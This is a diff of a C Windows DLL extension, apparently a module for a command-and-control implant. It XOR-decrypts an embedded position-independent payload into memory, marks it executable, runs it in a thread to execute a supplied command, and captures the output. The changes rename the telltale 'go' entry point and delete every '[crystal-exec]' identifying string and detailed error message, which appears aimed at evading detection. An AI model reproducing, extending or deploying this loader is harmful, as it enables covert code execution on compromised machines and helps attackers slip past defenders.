@@ -26,7 +26,7 @@
 #define EXPORT __declspec(dllexport)
 #endif
 
-typedef int  (*goCallback)(char *, int);
+typedef int  (*ExtCallback)(char *, int);
 typedef void (*pico_entry_t)(void *);
 
 /* ── output buffer ───────────────────────────────────────────────────────── */
@@ -97,20 +97,19 @@ static DWORD WINAPI reader_thread_proc(LPVOID param)
 
 /* ── extension entrypoint ────────────────────────────────────────────────── */
 
-EXPORT int __cdecl go(char *argsBuffer, uint32_t bufferSize, goCallback callback)
+EXPORT int __cdecl Initialize(char *argsBuffer, uint32_t bufferSize, ExtCallback callback)
 {
-    /* Single output buffer — ONE callback call at the very end. */
     outbuf_t ob = { NULL, 0, OUT_CAP };
     ob.buf = (char *)VirtualAlloc(NULL, (SIZE_T)OUT_CAP,
                                   MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     if (!ob.buf) {
-        if (callback) callback("[crystal-exec] fatal: VirtualAlloc(output) failed\n", 50);
+        if (callback) callback("error: alloc failed\n", 20);
         return 1;
     }
 
-#define FAIL(msg) do { ob_printf(&ob, "[crystal-exec] error: " msg "\n"); goto done; } while(0)
+#define FAIL(msg) do { ob_printf(&ob, "error: " msg "\n"); goto done; } while(0)
 
-    if (!argsBuffer || bufferSize == 0) { FAIL("empty args"); }
+    if (!argsBuffer || bufferSize == 0) { FAIL("no args"); }
 
     /* Parse "cmd=<value>" */
     int scan   = (int)bufferSize < 64 ? (int)bufferSize : 64;
@@ -118,22 +117,20 @@ EXPORT int __cdecl go(char *argsBuffer, uint32_t bufferSize, goCallback callback
     for (int i = 0; i < scan; i++) {
         if ((unsigned char)argsBuffer[i] == '=') { eq_pos = i; break; }
     }
-    if (eq_pos < 1) { FAIL("expected cmd=<value>"); }
+    if (eq_pos < 1) { FAIL("invalid args"); }
 
     int cmd_start = eq_pos + 1;
     int cmd_len   = (int)bufferSize - cmd_start;
-    if (cmd_len <= 0 || cmd_len >= 4096) { FAIL("cmd length invalid"); }
+    if (cmd_len <= 0 || cmd_len >= 4096) { FAIL("invalid args"); }
 
     char cmd[4096];
     memcpy(cmd, argsBuffer + cmd_start, (size_t)cmd_len);
     cmd[cmd_len] = '\0';
 
-    ob_printf(&ob, "[crystal-exec] cmd: %s\n", cmd);
-
     /* Anonymous pipe for output */
     SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };
     HANDLE hRead = NULL, hWrite = NULL;
-    if (!CreatePipe(&hRead, &hWrite, &sa, 0)) { FAIL("CreatePipe failed"); }
+    if (!CreatePipe(&hRead, &hWrite, &sa, 0)) { FAIL("pipe failed"); }
     SetHandleInformation(hRead, HANDLE_FLAG_INHERIT, 0);
 
     /* pico_args = "<hwrite_hex>|<cmd>" */
@@ -142,14 +139,14 @@ EXPORT int __cdecl go(char *argsBuffer, uint32_t bufferSize, goCallback callback
                                   (void *)hWrite, cmd);
     if (pico_args_len <= 0 || pico_args_len >= (int)sizeof(pico_args)) {
         CloseHandle(hRead); CloseHandle(hWrite);
-        FAIL("pico_args overflow");
+        FAIL("args overflow");
     }
 
     char *args_buf = (char *)VirtualAlloc(NULL, (SIZE_T)(pico_args_len + 1),
                                           MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     if (!args_buf) {
         CloseHandle(hRead); CloseHandle(hWrite);
-        FAIL("VirtualAlloc(args) failed");
+        FAIL("alloc failed");
     }
     memcpy(args_buf, pico_args, (size_t)(pico_args_len + 1));
 
@@ -159,7 +156,7 @@ EXPORT int __cdecl go(char *argsBuffer, uint32_t bufferSize, goCallback callback
     if (!pico_mem) {
         VirtualFree(args_buf, 0, MEM_RELEASE);
         CloseHandle(hRead); CloseHandle(hWrite);
-        FAIL("VirtualAlloc(pico) failed");
+        FAIL("alloc failed");
     }
     /* XOR-decrypt embedded PICO into RW region */
     unsigned char *dst = (unsigned char *)pico_mem;
@@ -171,13 +168,10 @@ EXPORT int __cdecl go(char *argsBuffer, uint32_t bufferSize, goCallback callback
         VirtualFree(pico_mem,  0, MEM_RELEASE);
         VirtualFree(args_buf, 0, MEM_RELEASE);
         CloseHandle(hRead); CloseHandle(hWrite);
-        FAIL("VirtualProtect(pico) failed");
+        FAIL("exec failed");
     }
 
-    ob_printf(&ob, "[crystal-exec] PICO size: %u bytes\n", crystalexec_pico_len);
-
-    /* Allocate reader buffer (shared with reader thread) */
-    DWORD   cmd_out_cap = 3 * 1024 * 1024;   /* 3 MB for command output */
+    DWORD   cmd_out_cap = 3 * 1024 * 1024;
     char   *cmd_out_buf = (char *)VirtualAlloc(NULL, cmd_out_cap,
                                                MEM_COMMIT | MEM_RESERVE,
                                                PAGE_READWRITE);
@@ -185,7 +179,7 @@ EXPORT int __cdecl go(char *argsBuffer, uint32_t bufferSize, goCallback callback
         VirtualFree(pico_mem, 0, MEM_RELEASE);
         VirtualFree(args_buf, 0, MEM_RELEASE);
         CloseHandle(hRead); CloseHandle(hWrite);
-        FAIL("VirtualAlloc(cmd_out) failed");
+        FAIL("alloc failed");
     }
 
     reader_state_t rs = { .hRead = hRead, .buf = cmd_out_buf,
@@ -198,8 +192,7 @@ EXPORT int __cdecl go(char *argsBuffer, uint32_t bufferSize, goCallback callback
     };
     HANDLE hPico = CreateThread(NULL, 0, pico_thread_proc, &pico_ta, 0, NULL);
     if (!hPico) {
-        ob_printf(&ob, "[crystal-exec] error: CreateThread(pico) failed (%lu)\n",
-                  GetLastError());
+        ob_printf(&ob, "error: exec failed (%lu)\n", GetLastError());
         CloseHandle(hWrite);
         if (hReader) { WaitForSingleObject(hReader, 5000); CloseHandle(hReader); }
         CloseHandle(hRead);
@@ -209,15 +202,9 @@ EXPORT int __cdecl go(char *argsBuffer, uint32_t bufferSize, goCallback callback
         goto done;
     }
 
-    ob_printf(&ob, "[crystal-exec] PICO thread started, waiting...\n");
-
-    /* 30-second cap — if PICO hangs this returns WAIT_TIMEOUT */
     DWORD wait_res = WaitForSingleObject(hPico, 30000);
     CloseHandle(hPico);
     VirtualFree(args_buf, 0, MEM_RELEASE);
-
-    ob_printf(&ob, "[crystal-exec] PICO wait returned: %s\n",
-              wait_res == WAIT_OBJECT_0 ? "SIGNALED" : "TIMEOUT");
 
     /* Close write end → EOF on read end → reader thread finishes */
     CloseHandle(hWrite);
@@ -228,12 +215,10 @@ EXPORT int __cdecl go(char *argsBuffer, uint32_t bufferSize, goCallback callback
     }
     CloseHandle(hRead);
 
-    if (rs.len > 0) {
-        ob_printf(&ob, "[crystal-exec] output (%lu bytes):\n", rs.len);
+    if (rs.len > 0)
         ob_append(&ob, cmd_out_buf, (int)rs.len);
-    } else {
-        ob_printf(&ob, "[crystal-exec] (no output from command)\n");
-    }
+    else if (wait_res == WAIT_TIMEOUT)
+        ob_printf(&ob, "timeout\n");
 
     VirtualFree(cmd_out_buf, 0, MEM_RELEASE);
 
